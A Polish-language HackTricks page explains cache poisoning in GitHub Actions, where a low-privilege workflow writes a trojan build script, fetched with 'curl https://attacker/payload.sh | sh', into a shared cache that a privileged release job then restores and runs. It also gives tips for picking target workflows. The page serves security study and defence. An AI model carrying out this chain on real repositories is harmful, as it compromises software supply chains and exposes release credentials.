# GH Actions - Cache Poisoning

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Cache GitHub Actions jest globalny dla repozytorium. Każdy workflow, który zna cache `key` (lub `restore-keys`), może wypełnić ten wpis, nawet jeśli job ma jedynie `permissions: contents: read`. GitHub nie segreguje cache według workflow, typu zdarzenia ani poziomu zaufania, więc atakujący, który przejmie job o niskich uprawnieniach, może zatruć cache, który później przywróci uprzywilejowany job wydania. Tak właśnie kompromitacja Ultralytics przekształciła się z workflow `pull_request_target` w pipeline publikujący do PyPI.

## Podstawy ataku

- `actions/cache` udostępnia zarówno operacje restore, jak i save (`actions/cache@v4`, `actions/cache/save@v4`, `actions/cache/restore@v4`). Wywołanie save jest dozwolone dla każdego job, z wyjątkiem naprawdę niezaufanych workflow `pull_request` uruchamianych z forków.
- Wpisy cache są identyfikowane wyłącznie przez `key`. Szerokie `restore-keys` ułatwiają wstrzyknięcie payloadów, ponieważ atakujący musi jedynie spowodować kolizję z prefiksem.
- Zawartość cache (system plików) jest przywracana bez zmian. Jeśli cache zawiera skrypty lub binaria, które zostaną później uruchomione, atakujący kontroluje ścieżkę ich wykonania.

## Przykładowy łańcuch eksploatacji

_Workflow autora (`pull_request_target`) zatruł cache:_
```yaml
steps:
- run: |
mkdir -p toolchain/bin
printf '#!/bin/sh\ncurl https://attacker/payload.sh | sh\n' > toolchain/bin/build
chmod +x toolchain/bin/build
- uses: actions/cache/save@v4
with:
path: toolchain
key: linux-build-${{ hashFiles('toolchain.lock') }}
```
_Uprzywilejowany workflow został przywrócony i wykonał poisoned cache:_
```yaml
steps:
- uses: actions/cache/restore@v4
with:
path: toolchain
key: linux-build-${{ hashFiles('toolchain.lock') }}
- run: toolchain/bin/build release.tar.gz
```
Drugi job uruchamia teraz kod kontrolowany przez atakującego, jednocześnie posiadając dane uwierzytelniające do release'ów (PyPI tokens, PATs, cloud deploy keys, etc.).

## Praktyczne wskazówki

- Celuj w workflowy wywoływane przez `pull_request_target`, `issue_comment`, lub komendy bota, które nadal zapisują cache; GitHub pozwala im nadpisać klucze obowiązujące w całym repo nawet gdy runner ma tylko dostęp do odczytu.
- Szukaj deterministycznych kluczy cache używanych przez różne granice zaufania (np. `pip-${{ hashFiles('poetry.lock') }}`) lub nadmiernie permisywnych `restore-keys`, a następnie zapisz swój złośliwy tarball zanim uruchomi się uprzywilejowany workflow.
- Monitoruj logi pod kątem wpisów `Cache saved` lub dodaj własny krok zapisujący cache, aby następny release job przywrócił payload i wykonał trojanizowane skrypty lub binaria.

## Źródła

- [A Survey of 2024–2025 Open-Source Supply-Chain Compromises and Their Root Causes](https://words.filippo.io/compromise-survey/)

{{#include ../../../banners/hacktricks-training.md}}
